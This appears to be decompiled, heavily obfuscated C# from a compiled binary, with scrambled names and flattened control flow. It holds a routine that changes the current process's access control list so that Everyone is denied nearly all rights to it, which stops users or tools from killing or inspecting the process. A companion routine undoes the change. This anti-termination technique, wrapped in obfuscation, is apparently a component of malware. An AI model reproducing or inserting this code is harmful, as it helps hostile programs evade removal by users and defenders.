using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

// Token: 0x02000027 RID: 39
internal class cgo
{
	// Token: 0x060000F6 RID: 246
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr GetCurrentProcess();

	// Token: 0x060000F7 RID: 247
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetKernelObjectSecurity(IntPtr cgs, int cgt, [Out] byte[] cgu, uint cgv, ref uint cgy);

	// Token: 0x060000F8 RID: 248
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool SetKernelObjectSecurity(IntPtr cgw, int cgq, byte[] cgz);

	// Token: 0x060000F9 RID: 249 RVA: 0x00023164 File Offset: 0x00021364
	private T chj<T>(ref T chk, T chl)
	{
		chk = chl;
		return chl;
	}

	// Token: 0x060000FA RID: 250 RVA: 0x0002317C File Offset: 0x0002137C
	private RawSecurityDescriptor chn()
	{
		IntPtr currentProcess = cgo.GetCurrentProcess();
		byte[] array = new byte[1];
		uint num = 0u;
		try
		{
			cgo.GetKernelObjectSecurity(currentProcess, 4, array, 0u, ref num);
			RawSecurityDescriptor result;
			for (;;)
			{
				IL_DA:
				uint num2 = 2481166472u;
				for (;;)
				{
					uint num3;
					switch ((num3 = (num2 ^ 3187908719u)) % 8u)
					{
					case 0u:
						goto IL_E5;
					case 1u:
						result = null;
						num2 = (num3 * 2927720574u ^ 3875457733u);
						continue;
					case 2u:
						if ((ulong)num > 32767UL)
						{
							num2 = (num3 * 4050003128u ^ 4270083935u);
							continue;
						}
						goto IL_42;
					case 3u:
						goto IL_DA;
					case 4u:
						goto IL_E1;
					case 5u:
						goto IL_42;
					case 7u:
						if ((ulong)num >= 0UL)
						{
							num2 = (num3 * 87714301u ^ 1129158206u);
							continue;
						}
						goto IL_E5;
					}
					goto Block_6;
					IL_42:
					if (cgo.GetKernelObjectSecurity(currentProcess, 4, this.chj<byte[]>(ref array, new byte[checked((int)(unchecked((ulong)num) - 1UL) + 1)]), num, ref num))
					{
						goto IL_E3;
					}
					num2 = 4151108102u;
				}
			}
			Block_6:
			goto IL_E3;
			IL_E1:
			return result;
			IL_E3:
			goto IL_F7;
			IL_E5:
			return null;
		}
		catch (Exception ex)
		{
		}
		IL_F7:
		return new RawSecurityDescriptor(array, 0);
	}

	// Token: 0x060000FB RID: 251 RVA: 0x0002329C File Offset: 0x0002149C
	public bool chu()
	{
		IntPtr currentProcess = cgo.GetCurrentProcess();
		try
		{
			RawSecurityDescriptor rawSecurityDescriptor = this.chn();
			for (;;)
			{
				IL_8A:
				uint num = 1230335467u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 997397372u)) % 4u)
					{
					case 0u:
						goto IL_91;
					case 2u:
						goto IL_8A;
					case 3u:
					{
						rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
						byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1)];
						rawSecurityDescriptor.GetBinaryForm(array, 0);
						if (cgo.SetKernelObjectSecurity(currentProcess, 4, array))
						{
							num = (num2 * 2361892974u ^ 1224112730u);
							continue;
						}
						break;
					}
					}
					goto Block_4;
				}
			}
			Block_4:
			goto IL_95;
			IL_91:
			return true;
			IL_95:;
		}
		catch (Exception ex)
		{
			return false;
		}
		return false;
	}

	// Token: 0x060000FC RID: 252 RVA: 0x00023364 File Offset: 0x00021564
	public bool chz()
	{
		IntPtr currentProcess = cgo.GetCurrentProcess();
		try
		{
			RawSecurityDescriptor rawSecurityDescriptor = this.chn();
			rawSecurityDescriptor.DiscretionaryAcl.RemoveAce(0);
			byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1)];
			for (;;)
			{
				IL_8B:
				uint num = 1808815934u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1413543602u)) % 5u)
					{
					case 0u:
						goto IL_8B;
					case 1u:
						goto IL_92;
					case 3u:
						rawSecurityDescriptor.GetBinaryForm(array, 0);
						num = (num2 * 1639027428u ^ 3058573468u);
						continue;
					case 4u:
						if (cgo.SetKernelObjectSecurity(currentProcess, 4, array))
						{
							num = (num2 * 1198812724u ^ 2259448202u);
							continue;
						}
						break;
					}
					goto Block_4;
				}
			}
			Block_4:
			goto IL_96;
			IL_92:
			return true;
			IL_96:;
		}
		catch (Exception ex)
		{
			bool result = false;
			for (;;)
			{
				IL_DE:
				uint num3 = 848863705u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num3 ^ 1413543602u)) % 3u)
					{
					case 0u:
						goto IL_DE;
					case 2u:
						num3 = (num2 * 1486999702u ^ 3616553136u);
						continue;
					}
					goto Block_6;
				}
			}
			Block_6:
			return result;
		}
		return false;
	}
}
